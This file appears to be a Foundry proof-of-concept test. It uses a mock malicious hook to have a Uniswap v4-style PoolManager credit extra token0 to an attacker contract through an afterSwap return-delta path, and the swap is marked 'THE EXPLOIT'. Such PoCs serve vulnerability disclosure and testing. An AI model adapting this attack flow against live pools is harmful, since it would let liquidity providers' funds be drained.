// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";

contract Token {
    mapping(address=>uint) public balanceOf;
    function mint(address t,uint a) external {balanceOf[t]+=a;}
    function transfer(address t,uint a) external returns(bool){balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true;}
    function transferFrom(address f,address t,uint a) external returns(bool){balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function approve(address,uint) external pure returns(bool){return true;}
}
contract POC is Test {
    PoolManager public manager; MaliciousDeltaHook public hook;
    Token public token0; Token public token1; PoolKey public key;
    function setUp() public {
        Token t0=new Token(); Token t1=new Token();
        if(address(t0)>address(t1)){Token tmp=t0; t0=t1; t1=tmp;}
        token0=t0; token1=t1;
        manager=new PoolManager(address(this));
        uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
        vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
        hook=MaliciousDeltaHook(a);
        vm.store(address(hook), bytes32(0), bytes32(uint256(uint160(address(manager)))));
        token0.mint(address(this),1000e18); token1.mint(address(this),1000e18);
        token0.mint(address(manager),1000e18); token1.mint(address(manager),1000e18);
        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
        hook.setCurrency1(Currency.wrap(address(token1))); hook.setAttacker(address(this));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        manager.unlock(abi.encode(uint256(1)));
    }
    function unlockCallback(bytes calldata d) external returns(bytes memory){
        Currency c0=Currency.wrap(address(token0)); Currency c1=Currency.wrap(address(token1));
        if(abi.decode(d,(uint256))==1){
            (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
            if(delta.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-delta.amount0())); manager.settle();}
            if(delta.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-delta.amount1())); manager.settle();}
            if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
            if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
        } else {
            // THIS IS THE EXPLOIT - s already includes hook's 100e18
            BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
            if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
            else if(s.amount0()>0){manager.take(c0, address(this), uint128(s.amount0()));}
            if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
            else if(s.amount1()>0){manager.take(c1, address(this), uint128(s.amount1()));}
        }
        return "";
    }
    function test_afterSwapReturnDelta() public {
        uint b0 = token0.balanceOf(address(this));
        manager.unlock(abi.encode(uint256(2)));
        assertGt(token0.balanceOf(address(this)), b0);
    }
}